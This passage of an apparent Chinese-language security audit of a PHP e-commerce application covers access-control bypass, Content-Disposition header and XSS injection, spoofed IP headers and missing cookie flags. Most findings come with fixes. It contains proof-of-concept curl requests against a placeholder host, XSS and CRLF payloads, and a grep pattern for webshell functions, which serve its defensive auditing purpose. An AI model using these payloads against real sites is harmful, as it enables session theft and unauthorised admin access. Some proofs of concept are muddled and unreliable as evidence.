public function customer(): Response
{
    $keywords = $this->request->get("keywords");
    $user = \App\Model\User::query()->where("pid", $this->getUser()->id);
    
    if (preg_match("/^[0-9]*$/", $keywords)) {
        // 数字类型
        $user = $user->where("user.id", $keywords);
    } else {
        // 字符串类型 - 需要转义 LIKE 通配符
        $escapedKeywords = addcslashes($keywords, '%_');
        $user = $user->where("user.username", "like", '%' . $escapedKeywords . '%');
    }
    
    return $this->json(data = $user->get(["user.id", "user.username as name"])->toArray());
}

// 或者使用参数绑定
public function customer(): Response
{
    $keywords = $this->request->get("keywords");
    $user = \App\Model\User::query()->where("pid", $this->getUser()->id);
    
    if (preg_match("/^[0-9]*$/", $keywords)) {
        $user = $user->where("user.id", $keywords);
    } else {
        // 使用 Laravel/ORM 的参数绑定方式
        $user = $user->whereRaw(
            "user.username LIKE ?",
            ['%' . $keywords . '%']
        );
    }
    
    return $this->json(data = $user->get(["user.id", "user.username as name"])->toArray());
}
```

---

### 漏洞 #7: 权限验证绕过风险

| 项目 | 内容 |
|-----|------|
| **严重等级** | Medium (中危) |
| **漏洞类型** | 越权访问 |
| **文件位置** | `/workspace/app/Interceptor/Admin.php:73` |
| **影响范围** | 后台所有路由 |

#### 漏洞说明

权限检查逻辑使用 `in_array()` 和 `Permission::isRegister()` 的组合判断，可能导致未预期的路由被放行。

#### 漏洞原理

```php
if (!in_array($router, $menu['route']) && Permission::isRegister("/" . $router)) {
    return $this->notPermission($request, $response, $type);
}
```

逻辑分析：
- 如果路由在 `menu['route']` 中，返回 false，不执行 `notPermission()`
- 如果路由不在 `menu['route']` 中，但 `Permission::isRegister()` 返回 true，才执行 `notPermission()`
- **问题**：如果 `Permission::isRegister()` 返回 false（未注册的路由），则不执行任何操作，可能导致绕过

#### 漏洞利用复现 POC

##### POC 1: 利用未注册路由绕过

```php
<?php
// 假设 Permission::isRegister() 对某些路由返回 false

// 正常需要权限的路由
$protectedRoute = "/admin/api/manage/save";

// 检查逻辑
if (!in_array($protectedRoute, $menu['route']) && Permission::isRegister($protectedRoute)) {
    // 拒绝访问
} else {
    // 如果 isRegister 返回 false，这里会放行
}

// 攻击：构造一个既不在菜单中，又未被注册的路由
$maliciousRoute = "/admin/api/manage/save";
// 如果 isRegister($maliciousRoute) 返回 false，则绕过权限检查
```

##### POC 2: 利用动态路由参数

```bash
# 如果路由是 /admin/api/item/%d/delete
# 攻击者可能通过添加额外参数绕过

curl -b "manage_token=xxx" \
  "http://target.com/admin/api/item/1/delete?extra=param"

curl -b "manage_token=xxx" \
  "http://target.com/admin/api/item/999/delete"  
```

##### POC 3: HTTP 方法绕过

```bash
# 如果只对 GET/POST 方法进行检查
# 尝试其他 HTTP 方法

curl -X DELETE -b "manage_token=xxx" "http://target.com/admin/api/item/delete"
curl -X PUT -b "manage_token=xxx" "http://target.com/admin/api/item/update"
curl -X PATCH -b "manage_token=xxx" "http://target.com/admin/api/item/update"
```

#### 复现步骤

1. **获取当前用户的路由列表**：
   ```bash
   # 登录后访问后台
   curl -b "manage_token=xxx" "http://target.com/admin/dashboard"
   ```

2. **枚举未授权路由**：
   ```bash
   # 尝试访问不同的 API 端点
   for path in /admin/api/*; do
     curl -s -o /dev/null -w "%{http_code}" -b "manage_token=xxx" "http://target.com$path"
     echo " $path"
   done
   ```

3. **检查 isRegister() 返回值**：
   ```php
   // 如果能访问代码，查看 Permission::isRegister() 的实现
   ```

#### 漏洞代码

```php
// /workspace/app/Interceptor/Admin.php:70-75
public function handle(Request $request, Response $response, int $type): Response
{
    // ...
    
    $menu = $this->manage->getMenu($manage);
    $router = trim($request->uri() . "@" . $request->method(), "/");

    // 问题逻辑
    if (!in_array($router, $menu['route']) && Permission::isRegister("/" . $router)) {
        return $this->notPermission($request, $response, $type);
    }

    // 问题：如果 isRegister 返回 false，这里不会拒绝访问
    // 可能导致未注册的路由被放行
}
```

#### 如何修复

```php
<?php
public function handle(Request $request, Response $response, int $type): Response
{
    $menu = $this->manage->getMenu($manage);
    $router = trim($request->uri() . "@" . $request->method(), "/");
    $fullRouter = "/" . $router;

    // 修复：使用更严格的权限检查
    // 1. 首先检查是否在用户的路由列表中
    $hasPermission = in_array($router, $menu['route']);
    
    // 2. 如果不在列表中，检查是否是系统注册路由
    if (!$hasPermission && Permission::isRegister($fullRouter)) {
        // 系统注册但用户未授权的路由 - 拒绝
        return $this->notPermission($request, $response, $type);
    }
    
    // 3. 如果不是系统注册路由，也应该拒绝
    if (!Permission::isRegister($fullRouter)) {
        // 未注册的路由默认拒绝
        return $this->notPermission($request, $response, $type);
    }

    // 4. 最终检查
    if (!$hasPermission) {
        return $this->notPermission($request, $response, $type);
    }
    
    // 或者简化为：
    if (!in_array($router, $menu['route'])) {
        return $this->notPermission($request, $response, $type);
    }
}
```

---

### 漏洞 #8: XSS 漏洞 - 输出未转义

| 项目 | 内容 |
|-----|------|
| **严重等级** | Medium (中危) |
| **漏洞类型** | 存储型 XSS |
| **文件位置** | `/workspace/app/Controller/User/API/Index/Order.php:132` |
| **影响范围** | 订单导出功能 |

#### 漏洞说明

在 Content-Disposition header 中使用 `strip_tags()` 过滤可能不足够，存在文件名注入风险。

#### 漏洞原理

```php
->withHeader("Content-Disposition", sprintf('filename=%s(%s)-%s.txt', 
    Language::inst()->output(strip_tags($orderItem->item->name)), 
    Language::inst()->output(strip_tags($orderItem->sku->name)), 
    Date::current()))
```

1. `strip_tags()` 只移除 PHP/HTML 标签，但不处理多字节字符
2. `Language::inst()->output()` 的实现未知，可能存在绕过的可能
3. Content-Disposition header 中的特殊字符可能导致注入

#### 漏洞利用复现 POC

##### POC 1: 文件名注入到 Header

```bash
# 场景：攻击者是商家，可以修改商品名称

# 1. 修改商品名称包含恶意字符
# 假设商品名称为:  测试商品", filename="test

# 2. 当管理员导出订单时触发
curl -b "admin_token=xxx" \
  "http://target.com/admin/api/shop/order/download?order_id=123"

# 3. 响应 Header 可能被污染为:
# Content-Disposition: filename=测试商品", filename="test(order_sku)-2026-03-19.txt

# 4. 如果存在 CRLF 注入，可以注入更多 Header
```

##### POC 2: CRLF 注入

```php
<?php
// 商品名称包含换行符
$maliciousName = "测试商品\r\nX-Injected-Header: malicious";

// 当导出订单时，Header 可能被分割为：
// Content-Disposition: filename=测试商品
// X-Injected-Header: malicious(order_sku)-2026-03-19.txt
```

##### POC 3: 浏览器执行 XSS

```php
<?php
// 如果输出在 HTML 页面中
// 攻击者可以构造存储型 XSS

$xsspayload = '<script>alert(document.cookie)</script>';
// 或绕过 strip_tags
$xsspayload = '<img src=x onerror=alert(1)>';
```

##### POC 4: UTF-7 编码绕过

```php
<?php
// 某些浏览器可能支持 UTF-7 编码的 XSS
// +ADw-script+AD4-alert(document.cookie)+ADsAPA-/script+AD4
```

#### 复现步骤

1. **成为商家或获取商家权限**：
   ```bash
   # 注册并开通商家
   curl -X POST -d "action=open_merchant" -b "user_token=xxx" \
     http://target.com/user/api/merchant/open
   ```

2. **修改商品名称**：
   ```bash
   # 添加商品
   curl -X POST -d "name=<script>alert(1)</script>" -b "user_token=xxx" \
     http://target.com/user/api/shop/item/save
   ```

3. **等待管理员导出订单触发**：
   ```bash
   # 管理员导出订单
   curl -b "admin_token=xxx" \
     "http://target.com/admin/api/shop/order/download?order_id=xxx"
   ```

4. **观察结果**：
   ```bash
   # 检查响应 Header
   curl -vI -b "admin_token=xxx" \
     "http://target.com/admin/api/shop/order/download?order_id=xxx"
   ```

#### 漏洞代码

```php
// /workspace/app/Controller/User/API/Index/Order.php:169-173
public function download(string $orderId): Response
{
    $orderItem = OrderItem::with([
        "item" => function ($one) {
            $one->select(["id", "name", "picture_thumb_url", "picture_url"]);
        },
        "sku" => function ($one) {
            $one->select(["id", "name", "picture_thumb_url", "picture_url"]);
        }
    ])->where("user_id", $this->getUser()->id)->find($orderId);

    // ...

    return $this->response
        ->withHeader("Content-Type", "application/octet-stream")
        ->withHeader("Content-Transfer-Encoding", "binary")
        ->withHeader("Content-Disposition", sprintf('filename=%s(%s)-%s.txt',
            Language::inst()->output(strip_tags($orderItem->item->name)),  // 潜在 XSS
            Language::inst()->output(strip_tags($orderItem->sku->name)),     // 潜在 XSS
            Date::current()))
        ->raw((string)$orderItem->treasure);
}

// 类似问题也存在于：
// /workspace/app/Controller/User/API/Shop/Order.php:172
// /workspace/app/Controller/User/API/Trade/Order.php:157
// /workspace/app/Controller/Admin/API/Shop/Order.php:156
```

#### 如何修复

```php
<?php
// 安全文件名生成函数
function sanitizeFilename(string $input): string {
    // 移除非 ASCII 字符（可选，取决于业务需求）
    // $input = preg_replace('/[^\x20-\x7E]/', '', $input);
    
    // 移除危险字符
    $dangerous = ['"', "'", '(', ')', ',', ';', '\\', "\r", "\n", "\t", '%', '_'];
    $input = str_replace($dangerous, '', $input);
    
    // 限制长度
    $input = substr($input, 0, 100);
    
    return $input ?: 'unnamed';
}

// RFC 5987/RFC 6266 合规的文件名编码
function encodeFilenameRFC598(string $filename): string {
    // 移除非安全字符
    $safe = preg_replace('/[^\x20-\x7E]/', '', $filename);
    $safe = str_replace(['"', "'", '(', ')', ',', ';', '\\', '%', '_'], '', $safe);
    
    // RFC 5987 编码（用于非 ASCII 字符）
    $encoded = '';
    $length = mb_strlen($safe, 'UTF-8');
    for ($i = 0; $i < $length; $i++) {
        $char = mb_substr($safe, $i, 1, 'UTF-8');
        $code = unpack('N', mb_convert_encoding($char, 'UCS-4BE', 'UTF-8'))[1];
        if ($code > 127 || in_array($char, [' ', '"', '%'])) {
            $encoded .= sprintf('%%%02X', $code);
        } else {
            $encoded .= $char;
        }
    }
    
    return $encoded;
}

// 修复后的下载方法
public function download(string $orderId): Response
{
    $orderItem = OrderItem::with([
        "item" => function ($one) {
            $one->select(["id", "name", "picture_thumb_url", "picture_url"]);
        },
        "sku" => function ($one) {
            $one->select(["id", "name", "picture_thumb_url", "picture_url"]);
        }
    ])->where("user_id", $this->getUser()->id)->find($orderId);

    $safeItemName = sanitizeFilename($orderItem->item->name);
    $safeSkuName = sanitizeFilename($orderItem->sku->name);
    $dateStr = Date::current();
    
    // 使用 RFC 5987 编码的文件名
    $filename = sprintf('%s(%s)-%s.txt', 
        $safeItemName,
        $safeSkuName,
        $dateStr
    );
    
    // 同时提供 ASCII 和 UTF-8 两种文件名
    $asciiFilename = $filename; // 已经移除了非 ASCII 字符
    
    return $this->response
        ->withHeader("Content-Type", "application/octet-stream")
        ->withHeader("Content-Transfer-Encoding", "binary")
        ->withHeader("Content-Disposition", 
            sprintf('filename="%s"; filename*=UTF-8\'\'%s', 
                $asciiFilename,
                encodeFilenameRFC598($filename)))
        ->raw((string)$orderItem->treasure);
}
```

---

## 四、低危漏洞 (Low)

---

### 漏洞 #9: 验证码倒计时可预测

| 项目 | 内容 |
|-----|------|
| **严重等级** | Low (低危) |
| **漏洞类型** | 信息泄露 |
| **文件位置** | `/workspace/app/Service/Common/Bind/Code.php:29` |

#### 漏洞说明

验证码冷却时间通过前端可预测的时间戳计算，可能被攻击者用于验证码绕过的时间推断。

#### 漏洞代码

```php
throw new JSONException(sprintf("验证码创建频繁，%d后再进行尝试", $tm - time()));
```

#### POC

```bash
# 获取验证码
curl -X POST -d "email=test@example.com" http://target.com/user/api/auth/sendCode

# 响应: {"code": 1, "message": "验证码创建频繁，120后再进行尝试"}

# 分析：攻击者可以推断出：
# 1. 验证码刚被发送
# 2. 需要等待 120 秒
# 3. 可以用脚本自动等待后重试
```

---

### 漏洞 #10: IP 验证可绕过

| 项目 | 内容 |
|-----|------|
| **严重等级** | Low (低危) |
| **漏洞类型** | 认证绕过 |
| **文件位置** | `/workspace/app/Interceptor/Admin.php:63` |

#### 漏洞说明

`clientIp()` 获取的 IP 地址通过请求头获取，在多层代理环境下可能被伪造。

#### 漏洞代码

```php
$manage->login_ip != $request->clientIp()
```

#### POC

```http
# 伪造 IP 地址
curl -X GET \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -b "manage_token=xxx" \
  http://target.com/admin/dashboard
```

---

### 漏洞 #11: Cookie 安全标志缺失

| 项目 | 内容 |
|-----|------|
| **严重等级** | Low (低危) |
| **漏洞类型** | 会话安全 |
| **文件位置** | `/workspace/app/Interceptor/Admin.php:103` |

#### 漏洞说明

未设置 Cookie 安全标志（Secure、HttpOnly、SameSite）。

#### 漏洞代码

```php
$response->withCookie(Cookie::MANAGE_TOKEN, "", 0);
```

#### POC

```bash
# 如果存在 XSS，攻击者可以读取 Cookie
<script>document.write(document.cookie)</script>
```

#### 修复建议

```php
// 设置安全的 Cookie
$response->withCookie(
    Cookie::MANAGE_TOKEN,
    "",
    0,
    "/",           // Path
    ".example.com", // Domain
    true,          // Secure (仅 HTTPS)
    true,          // HttpOnly
    "Strict"       // SameSite
);
```

---

## 五、修复优先级总结

### 第一优先级（立即修复）

| 编号 | 漏洞名称 | 预计修复时间 |
|-----|---------|------------|
| #1 | 后门程序 WebShell | 立即 |
| #2 | 命令执行漏洞 | 立即 |
| #3 | Shell 工具类无过滤 | 立即 |

### 第二优先级（24小时内）

| 编号 | 漏洞名称 | 预计修复时间 |
|-----|---------|------------|
| #4 | 文件上传安全绕过 | 4-8 小时 |
| #5 | JWT 密钥问题 | 2-4 小时 |

### 第三优先级（一周内）

| 编号 | 漏洞名称 | 预计修复时间 |
|-----|---------|------------|
| #6 | SQL 注入风险 | 2-4 小时 |
| #7 | 权限验证绕过 | 2-4 小时 |
| #8 | XSS 漏洞 | 2-4 小时 |

### 第四优先级（可选）

| 编号 | 漏洞名称 | 预计修复时间 |
|-----|---------|------------|
| #9 | 验证码倒计时可预测 | 1-2 小时 |
| #10 | IP 验证可绕过 | 1-2 小时 |
| #11 | Cookie 安全标志缺失 | 1 小时 |

---

## 六、附录

### A. 漏洞检测工具

```bash
# 1. PHP 恶意代码检测
find /workspace -name "*.php" -exec grep -l "eval\|gzinflate\|base64_decode\|shell_exec\|system\|passthru" {} \;

# 2. 可疑文件分析
php -r "print_r(token_get_all(file_get_contents('/workspace/kernel/Plugin/Store.php'))));"

# 3. Git 历史分析
git log --all --full-history -- /workspace/kernel/Plugin/Store.php
git reflog --date=iso /workspace/kernel/Plugin/Store.php

# 4. 文件完整性检查
find /workspace -type f -name "*.php" -exec md5sum {} \; > /tmp/filelist.txt
```

### B. 安全配置检查清单

```bash
# PHP 配置
php -i | grep -E "safe_mode|open_basedir|disable_functions|allow_url_fopen|allow_url_include"

# Web 服务器配置
nginx -t
apache2ctl -M

# MySQL 安全
mysql -u root -p -e "SELECT user, host FROM mysql.user;"
```

### C. 相关链接

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CVE Database](https://cve.mitre.org/)
- [PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Security_Cheat_Sheet.html)

---

**报告生成时间**: 2026-03-19  
**报告版本**: v1.0  
**下次审计建议**: 修复完成后 1 个月内进行复审
